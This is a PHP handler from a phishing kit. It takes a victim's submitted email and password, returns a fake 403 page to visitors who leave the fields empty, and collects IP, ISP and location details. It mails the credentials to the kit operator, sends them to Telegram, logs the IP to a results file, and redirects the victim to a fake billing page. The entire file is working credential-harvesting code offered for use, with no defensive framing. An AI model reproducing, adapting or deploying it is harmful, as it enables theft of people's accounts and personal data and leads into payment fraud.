<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once("../blocker3.php");
require_once('../session.php');
$randomnumber = rand(1, 100);

if($_POST['email'] == "") {
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['password'] == "") {
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$ip = getUserIP();
$ispuser = getisp($ip);
$message  = "--------------------[ EMAIL LOGIN ]-------------------------\n";
$message .= "User ID    : ".$_POST['email']."\n";
$message .= "Password   : ".$_POST['password']."\n";
$message .= "--------------------------[ PC INFORMATION ]-------------------------\n";
$message .= "IP Address   : ".$ip."\n";
$message .= "ISP        : ".$ispuser."\n";
$message .= "Region       : ".$regioncity."\n";
$message .= "City       : ".$citykota."\n";
$message .= "Continent    : ".$continent."\n";
$message .= "Timezone   : ".$timezone."\n";
$message .= "OS/Browser   : ".$os." / ".$br."\n";
$message .= "Date     : ".$date."\n";
$message .= "User Agent   : ".$user_agent."\n";
$message .= "--------------------------[ Cyz4rine Inc. ]-----------------------------\n";
$subject = "TEMBUS EMAIL: ".$_POST['email']." [ $cn - $os - $ip ]";

$_SESSION['email_user'] = $_POST['email'];
$_SESSION['email_pass'] = $_POST['password'];
$from = "Email Access";
$to = $config['email_result'];
kirim_mail($to,$from,$subject,$message,$headers);
  tele_res($message);
tulis_file("../result/total_email.txt", $ip);
echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
exit();
?>
